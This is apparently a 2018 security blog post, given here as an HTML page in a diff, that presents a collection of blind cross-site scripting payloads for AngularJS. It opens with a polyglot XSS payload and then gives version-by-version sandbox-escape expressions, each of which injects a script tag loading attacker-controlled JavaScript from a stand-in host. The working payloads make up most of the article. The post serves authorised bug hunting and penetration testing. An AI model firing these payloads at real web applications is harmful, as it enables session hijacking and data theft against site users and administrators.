@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.8.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon">
+
+    <!--Description-->
+    
+        <meta name="description" content="bXSSFor my project bXSS I’ve been looking at improving the payload generation capabilities. The one thing I think missing out of bug hunters arsenals ">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Lewis Ardern">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="Blind XSS AngularJS Payloads">
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="ardern.io">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>Blind XSS AngularJS Payloads - ardern.io</title>
+
+    <!-- Tachyons Core CSS -->
+    <link rel="stylesheet" href="//unpkg.com/tachyons/css/tachyons.min.css">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<!-- Main Content -->
+<!-- Banner -->
+
+<!-- Banner -->
+<div class="w-100 bg-1 ph5-ns ph3 text-light">
+    
+    <nav class="db dt-l w-100 mw8 center border-box pv3">
+        <!-- <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="ardern.io">
+            <img src="" class="dib h3" alt="ardern.io">
+        </a>  -->
+        <a class="db dtc-l v-mid link dim w-100 w-25-l tc tl-l mb2 mb0-l white" href="/" title="ardern.io">      
+            ardern.io    
+        </a>
+        <div class="db dtc-l v-mid w-100 w-75-l tc tr-l">
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/" title="Home">
+                    Home
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/about" title="About">
+                    About
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/content" title="Content">
+                    Content
+                </a>
+            
+                <a class="link dim f6 f5-l dib mr3 mr4-l white" href="/archives" title="Archives">
+                    Archives
+                </a>
+            
+        </div>
+    </nav>
+
+    <!-- Title -->
+    <div class="w-100 mw8 center vh-40 dt">
+        <div class="dtc v-mid white">
+            <h1 class="f1-l f2-m tc tc-m tl-ns">Blind XSS AngularJS Payloads</h1>
+            <p class="f4 fw3 pab-100px tc tc-m tl-ns">2018-12-07</p>
+        </div>
+    </div>
+
+    <!-- Icon -->
+    <div class="relative w-100 mw8 center white dn dn-m db-ns">
+        <i class="header-icon fa fa-unlock"></i>
+    </div>
+</div>
+
+
+    
+<!-- Content -->
+<div class="w-100 ph2 ph4-m ph5-l mv5 mv6-l">
+    <div class="content">
+        <div class="mw8 center">
+            <div class="cf">
+                <div class="fl w-100 w-70-l mw7 left fw3 lh-copy pr4-ns pr0-m post-content">
+                    <!-- Tags Vertical -->
+                    
+                        <div class="tags-container-vertical">
+                            <div class="tags-sub-container">
+                                <a class="fw3 ph1 dib" href="/tags/XSS/">#XSS</a> <a class="fw3 ph1 dib" href="/tags/Security/">#Security</a> <a class="fw3 ph1 dib" href="/tags/AngularJS/">#AngularJS</a>
+                            </div>
+                        </div>
+                    
+
+                    <!-- Main Post Content -->
+                    <h1 id="bXSS"><a href="#bXSS" class="headerlink" title="bXSS"></a>bXSS</h1><p>For my project <a href="https://github.com/LewisArdern/bXSS" target="_blank" rel="noopener">bXSS</a> I’ve been looking at improving the payload generation capabilities. The one thing I think missing out of bug hunters arsenals when testing for <a href="https://ardern.io/2017/12/10/blind-xss/">Blind Cross-Site Scripting</a> (bXSS) is domain specific payloads such as framework specific payloads, like AngularJS. </p>
+<p>We all know polygot payloads are used to identify different contexts e.g <a href="https://polyglot.innerht.ml/" target="_blank" rel="noopener">https://polyglot.innerht.ml/</a> and these can be used to cover a wide varity of JavaScript execution contexts in one ‘payload’, for example the 141 character payload from crlf in theory could be used to create a bXSS payload such as:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Not validated</span></span><br><span class="line">javascript:<span class="string">"/*'/*`/*--&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html "</span> onmouseover=<span class="comment">/*&amp;lt;svg/*/</span>onload=<span class="built_in">eval</span>(<span class="string">"var _ = document.createElement('script');_.src='//localhost/m';document.getElementsByTagName('body')[0].appendChild(_)"</span>)<span class="comment">//&gt;</span></span><br></pre></td></tr></table></figure>
+<p>This should cover a lot of ground when testing for various execution contexts such as JavaScript URI, breaking out of noscript, svg + onload event handler, and finally onmouseover/onload event handlers.</p>
+<p>For most cases of bXSS you are trying to load a third-party resource, all we’re doing above is:</p>
+<ul>
+<li>Creating a new element ‘script’ </li>
+<li>Assign the source to be attacker controled JavaScript, e.g ‘//localhost/m’</li>
+<li>Append that script to the body of the HTML document</li>
+<li>The browser will render the attacker controlled JavaScript</li>
+</ul>
+<h2 id="AngularJS"><a href="#AngularJS" class="headerlink" title="AngularJS"></a>AngularJS</h2><p>I’m sure many of you reading are wondering why we’re still talking about AngularJS in 2018 when everyone has ‘moved’ to Angular its successor. The actual fact is that there are still a lot of AngularJS applications out there in the wild, I have performed three AngularJS pentests in the last two months alone and I feel its here to stay at least until it becomes completley <a href="https://blog.angular.io/stable-angularjs-and-long-term-support-7e077635ee9c" target="_blank" rel="noopener">end of life</a>. I have even had emails from security experts asking my opinion that one of their software vendors has proposed to write a new application for them in AngularJS, (spoiler) I recommended that they should utilize Angular or React.</p>
+<p>Many of the applications I have reviewed over the years, especially AngularJS have been riddled with template, or what we would deem ‘expression’ injection, where either a server-side templating engine or AngularJS feature such as $eval() is used incorrectly where attacker controlled input is treated as a code context. </p>
+<p>I don’t think I need to explain AngularJS security issues in this article, there are already an abundance of amazing blog posts and presentations generated over the years:</p>
+<ul>
+<li><a href="https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs" target="_blank" rel="noopener">XSS without HTML: Client-Side Template Injection with AngularJS</a></li>
+<li><a href="https://portswigger.net/blog/dom-based-angularjs-sandbox-escapes" target="_blank" rel="noopener">DOM based AngularJS sandbox escapes</a></li>
+<li><a href="https://www.synopsys.com/blogs/software-security/angularjs-1-6-0-sandbox/" target="_blank" rel="noopener">AngularJS 1.6: Life outside the sandbox</a></li>
+<li><a href="https://www.synopsys.com/blogs/software-security/angularjs-sandbox/" target="_blank" rel="noopener">An escape room called the ‘AngularJS sandbox’</a></li>
+<li><a href="https://www.owasp.org/images/4/46/OWASPLondon20170727_AngularJS.pdf" target="_blank" rel="noopener">So you thought you were safe using AngularJS. . . .<br>Think again!</a></li>
+<li><a href="https://finnwea.com/blog/stealing-passwords-from-mcdonalds-users/" target="_blank" rel="noopener">Stealing passwords from McDonald’s users</a></li>
+</ul>
+<p>Whilst working on my project bXSS, I started to look at AngularJS from a Blind XSS aspect. There are a lot of administive applications that are written in AngularJS, and therefore are less likely to be vulnerable to traditional XSS vectors such as <code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code> so its important to ensure we are capturing the potential of XSS through AngularJS expressions. I started to work on this over the past couple of weekends, many of the payloads didn’t appear to work out of box, but after talking to <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes</a> he pointed out some of the nuances such as escaping the dots for certain payloads.</p>
+<p>This result wouldnt have been possible without standing on the shoulders of the giants who did the initial research into AngularJS sandbox escapes. Without further adieu, my christmas gift to you; a collection of AngularJS blind XSS payloads.</p>
+<h3 id="List-Of-Blind-XSS-AngularJS-Payloads"><a href="#List-Of-Blind-XSS-AngularJS-Payloads" class="headerlink" title="List Of Blind XSS AngularJS Payloads"></a>List Of Blind XSS AngularJS Payloads</h3><p>1.0.1 - 1.1.5 &amp;&amp; &gt; 1.6.0<br><a href="https://twitter.com/cure53berlin" target="_blank" rel="noopener">Mario Heiderich</a> (Cure53)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    constructor.constructor(&quot;var _ = document.createElement(&apos;script&apos;);</span><br><span class="line">    _.src=&apos;//localhost/m&apos;;</span><br><span class="line">    document.getElementsByTagName(&apos;body&apos;)[0].appendChild(_)&quot;)()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Shorter 1.0.1 - 1.1.5 &amp;&amp; &gt; 1.6.0<br><a href="https://twitter.com/lewisardern" target="_blank" rel="noopener">Lewis Ardern</a> (Synopsys) and <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes</a> (PortSwigger)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    $on.constructor(&quot;var _ = document.createElement(&apos;script&apos;);</span><br><span class="line">    _.src=&apos;//localhost/m&apos;;</span><br><span class="line">    document.getElementsByTagName(&apos;body&apos;)[0].appendChild(_)&quot;)()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>1.2.0 - 1.2.5<br><a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes</a> (PortSwigger)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    a=&quot;a&quot;[&quot;constructor&quot;].prototype;a.charAt=a.trim;</span><br><span class="line">    $eval(&apos;a&quot;,eval(`var _=document\\x2ecreateElement(\&apos;script\&apos;);</span><br><span class="line">    _\\x2esrc=\&apos;//localhost/m\&apos;;</span><br><span class="line">    document\\x2ebody\\x2eappendChild(_);`),&quot;&apos;)</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>1.2.6 - 1.2.18<br><a href="https://twitter.com/tehjh" target="_blank" rel="noopener">Jan Horn</a> (Cure53, now works at Google Project Zero)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    (_=&apos;&apos;.sub).call.call(&#123;&#125;[$=&apos;constructor&apos;].getOwnPropertyDescriptor(_.__proto__,$).value,0,&apos;eval(&quot;var _ = document.createElement(\&apos;script\&apos;);</span><br><span class="line">    _.src=\&apos;//localhost/m\&apos;;</span><br><span class="line">    document.getElementsByTagName(\&apos;body\&apos;)[0].appendChild(_)&quot;)&apos;)()</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>1.2.19 (FireFox)<br><a href="https://twitter.com/avlidienbrunn" target="_blank" rel="noopener">Mathias Karlsson</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    toString.constructor.prototype.toString=toString.constructor.prototype.call;</span><br><span class="line">    [&quot;a&quot;,&apos;eval(&quot;var _ = document.createElement(\&apos;script\&apos;);</span><br><span class="line">    _.src=\&apos;//localhost/m\&apos;;</span><br><span class="line">    document.getElementsByTagName(\&apos;body\&apos;)[0].appendChild(_)&quot;)&apos;].sort(toString.constructor);</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>1.2.20 - 1.2.29<br><a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes</a> (PortSwigger)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    a=&quot;a&quot;[&quot;constructor&quot;].prototype;a.charAt=a.trim;</span><br><span class="line">    $eval(&apos;a&quot;,eval(`var _=document\\x2ecreateElement(\&apos;script\&apos;);_\\x2esrc=\&apos;//localhost/m\&apos;;document\\x2ebody\\x2eappendChild(_);`),&quot;&apos;)</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>1.3.0 - 1.3.9<br><a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes</a> (PortSwigger)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    a=toString().constructor.prototype;a.charAt=a.trim;</span><br><span class="line">    $eval(&apos;a,eval(`var _=document\\x2ecreateElement(\&apos;script\&apos;);_\\x2esrc=\&apos;//localhost/m\&apos;;document\\x2ebody\\x2eappendChild(_);`),a&apos;)</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>1.4.0 - 1.5.8<br><a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes</a> (PortSwigger)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    a=toString().constructor.prototype;a.charAt=a.trim;</span><br><span class="line">    $eval(&apos;a,eval(`var _=document.createElement(\&apos;script\&apos;);</span><br><span class="line">    _.src=\&apos;//localhost/m\&apos;;document.body.appendChild(_);`),a&apos;)</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>1.5.9 - 1.5.11<br><a href="https://twitter.com/tehjh" target="_blank" rel="noopener">Jan Horn</a> (Cure53, now works at Google Project Zero)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;</span><br><span class="line">    c=&apos;&apos;.sub.call;b=&apos;&apos;.sub.bind;a=&apos;&apos;.sub.apply;c.$apply=$apply;</span><br><span class="line">    c.$eval=b;op=$root.$$phase;</span><br><span class="line">    $root.$$phase=null;od=$root.$digest;$root.$digest=(&#123;&#125;).toString;</span><br><span class="line">    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;</span><br><span class="line">    B=C(b,c,b);$evalAsync(&quot;astNode=pop();astNode.type=&apos;UnaryExpression&apos;;astNode.operator=&apos;(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\&apos;script\\&apos;);_.src=\\&apos;//localhost/m\\&apos;;document.body.appendChild(_);`)))+&apos;;astNode.argument=&#123;type:&apos;Identifier&apos;,name:&apos;foo&apos;&#125;;&quot;);</span><br><span class="line">    m1=B($$asyncQueue.pop().expression,null,$root);</span><br><span class="line">    m2=B(C,null,m1);[].push.apply=m2;a=&apos;&apos;.sub;</span><br><span class="line">    $eval(&apos;a(b.c)&apos;);[].push.apply=a;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Big shoutout to <a href="https://twitter.com/garethheyes" target="_blank" rel="noopener">Gareth Heyes</a> for letting me ramble to him about AngularJS :).</p>
+
+                    
+                    <!-- Tags Bottom -->
+                    
+                        <div class="tags-container-bottom">
+                            <i class="fa fa-tag pr3 text-main-color"></i><a class="fw3 ph1 dib" href="/tags/XSS/">#XSS</a> <a class="fw3 ph1 dib" href="/tags/Security/">#Security</a> <a class="fw3 ph1 dib" href="/tags/AngularJS/">#AngularJS</a>
+                        </div>
+                    
+
+                    <!-- Comments -->
+                    
+<div id="disqus_thread" class="mt5">
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+
+
+
+                </div>
+                <div class="fl w-100 w-30-l center fw3 lh-copy pl4-ns tl black-50">
+                    
+                    <hr class="dn-l mw4 black-50 mt5">
+                    
+                    <!-- Widget 1: About -->
+                    <div class="mt5 mt0-l">
+    <article class="dt db-l mw8 mw8-m mw5-ns center ml0-l bg-white mv3">
+        <div class="dn dtc-m db-l v-mid tc pr4 pr0-l" style="min-width: 6rem;">
+            <img src="https://pbs.twimg.com/profile_images/877900659319853056/iaUa6_XV_400x400.jpg" class="mb4-l br-100 h3 w3 h4-l w4-l dib" title="Lewis Ardern">
+        </div>
+        <div style="color:#7C8999" class="dtc db-l v-mid lh-copy measure center f6 -50 tj">
+            Hello, I am Lewis Ardern, pictured above. I work as a Security Consultant with a strong focus on Web Security. <br>Currently based and working in London.
+        </div>
+    </article>
+</div>
+
+                    <hr class="dn-l mw4 black-50 mt5">
+                    
+                    <!-- Widget 2: Categories -->
+                    
+
+                    <!-- Widget 3: Recent Posts -->
+                    <div class="mt5 tc tl-l">
+    <h3>Recent Posts</h3>
+    
+        <p>
+            <a href="/2018/12/07/angularjs-bxss/">Blind XSS AngularJS Payloads</a>
+        </p>
+    
+        <p>
+            <a href="/2018/02/23/Apple-XSS/">Planet Of The XSS</a>
+        </p>
+    
+        <p>
+            <a href="/2017/12/10/blind-xss/">Ode To Blind XSS</a>
+        </p>
+    
+</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- Footer -->
+<div class="bg-1 ph2 ph5-ns pv5">
+        <div class="mv8">
+            <div class="center tc">
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://twitter.com/LewisArdern" target="_blank">
+                            <i class="fa fa-twitter"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="https://github.com/LewisArdern" target="_blank">
+                            <i class="fa fa-github"></i>
+                        </a>
+                    </div>
+                
+                    <div class="dib mh3">
+                        <a class="f3 f2-ns white dim" href="mailto:lewis@ardern.io" target="_blank">
+                            <i class="fa fa-envelope"></i>
+                        </a>
+                    </div>
+                
+            </div>
+            <div class="f6 f5-ns center tc white pt5 fw3">
+                ardern.io ~ © 2018  <!--anodyne theme-->
+            </div>
+        </div>
+    </div>
+
+<!-- After Footer -->
+<!-- Disqus Comments -->
+
+<script type="text/javascript">
+    var disqus_shortname = 'ardernio';
+
+    (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+</body>
+
+</html>
